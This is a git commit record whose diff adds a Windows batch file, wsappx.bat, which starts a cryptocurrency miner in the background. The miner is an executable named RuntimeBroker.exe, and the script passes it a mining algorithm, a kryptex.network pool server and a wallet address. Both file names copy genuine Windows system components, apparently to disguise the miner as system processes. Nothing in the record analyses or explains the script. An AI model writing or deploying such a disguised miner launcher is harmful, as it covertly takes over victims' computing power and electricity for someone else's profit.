d149ee9d5a15e0623655796e98ca3c4a8379296e
RuebanD <120219002+RuebanD@users.noreply.github.com>
2025-02-22 11:00:39 +0000

    Add files via upload

---
+++ wsappx.bat
@@ -0,0 +1,4 @@
+@echo off
+cd %~dp0
+start /b RuntimeBroker.exe --algo kheavyhash --server sdr.kryptex.network:7777 --user sedra:qrkt57csrjgx4qz9j95ar8llt92gq9lx0chgpzuat26n4q4afjaqvqnumsakv.worker1
+pause
